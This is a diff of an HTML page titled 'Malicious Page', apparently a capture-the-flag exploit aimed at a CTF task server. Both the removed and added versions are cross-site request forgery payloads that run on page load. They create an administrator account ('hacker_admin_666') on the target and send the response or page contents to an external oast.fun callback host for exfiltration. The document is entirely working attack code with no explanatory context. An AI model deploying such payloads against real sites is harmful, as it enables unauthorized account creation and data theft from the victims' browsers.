@@ -1,49 +1,20 @@
 <!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <title>Malicious Page</title>
-</head>
+<html>
 <body>
+    <form id="exploit" action="https://tasks.goidactf.ru:20431/create_admin" method="POST">
+        <input type="hidden" name="new_admin_login" value="hacker_admin_666">
+    </form>
+
     <script>
-        function createAdminAndExfil() {
-            const new_admin_login = 'hacker_admin';  // Choose your desired login
-            const params = new URLSearchParams({ new_admin_login: new_admin_login });
-            const targetUrl = 'https://tasks.goidactf.ru:20431/create_admin';
-            const webhookUrl = 'https://zzvqvwrdwxfyihbbkymvn6unl6cm7zezt.oast.fun/log';  // Replace with your actual webhook URL (e.g., from requestbin.com or your server)
+        document.getElementById('exploit').submit();
 
-            fetch(targetUrl, {
+        // Через 2–4 секунды отправляем себе ответ (если создание админа редиректит или отдаёт что-то)
+        setTimeout(() => {
+            fetch('https://zzvqvwrdwxfyihbbkymvn6unl6cm7zezt.oast.fun/???', {
                 method: 'POST',
-                headers: {
-                    'Content-Type': 'application/x-www-form-urlencoded'
-                },
-                body: params.toString(),
-                credentials: 'include'
-            })
-            .then(response => {
-                if (!response.ok) {
-                    throw new Error('Failed with status: ' + response.status);
-                }
-                return response.text();
-            })
-            .then(text => {
-                // Exfiltrate the response to your webhook
-                fetch(webhookUrl, {
-                    method: 'POST',
-                    body: text
-                });
-            })
-            .catch(error => {
-                // Optional: exfil error if needed
-                fetch(webhookUrl, {
-                    method: 'POST',
-                    body: 'Error: ' + error.message
-                });
+                body: document.body.innerHTML + '\n' + window.location.href
             });
-        }
-
-        // Run automatically when page loads
-        createAdminAndExfil();
+        }, 3000);
     </script>
 </body>
 </html>
